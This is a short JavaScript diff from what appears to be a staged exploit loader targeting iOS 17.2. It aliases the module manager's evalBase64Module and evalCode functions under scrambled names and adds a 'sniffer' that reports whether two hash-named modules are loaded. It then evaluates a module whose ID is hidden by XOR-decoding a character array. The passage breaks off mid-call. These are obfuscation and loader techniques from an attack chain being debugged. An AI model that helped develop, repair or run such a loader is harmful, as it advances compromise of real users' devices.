@@ -1,7 +1,25 @@
 // Variant A for iOS 17.2 is untested, might not work
+// Keep our translation layer
 globalThis.obChTK = globalThis.moduleManager;
 globalThis.moduleManager.fgPoij = globalThis.moduleManager.evalBase64Module;
 globalThis.moduleManager.hPL3On = globalThis.moduleManager.evalCode;
+
+// NEW: Sniff out the registered modules
+try {
+    // This is a bit advanced, but it tries to find the internal list of loaded modules
+    let modules = "Loaded Modules: ";
+    // We'll check the common IDs from your logs
+    let checkIDs = ["57620206d62079baad0e57e6d9ec93120c0f5247", "14669ca3b1519ba2a8f40be287f646d4d7593eb0"];
+    checkIDs.forEach(id => {
+        let m = globalThis.moduleManager.getModuleByName(id);
+        modules += `\n${id.slice(0,5)}...: ${m ? "✅ Found" : "❌ Missing"}`;
+    });
+    alert(modules);
+} catch (e) {
+    console.log("Sniffer failed: " + e);
+}
+
+
 let r = {};
 globalThis.moduleManager.evalBase64Module(([0, 6, 85, 80, 86, 86, 80, 0, 10, 80, 86, 82, 87, 85, 11, 81, 10, 0, 81, 82, 0, 82, 1, 10, 85, 86, 7, 5, 7, 0, 80, 81, 1, 6, 10, 10, 7, 6, 6, 11].map(x => {
     return String.fromCharCode(x ^ 51);
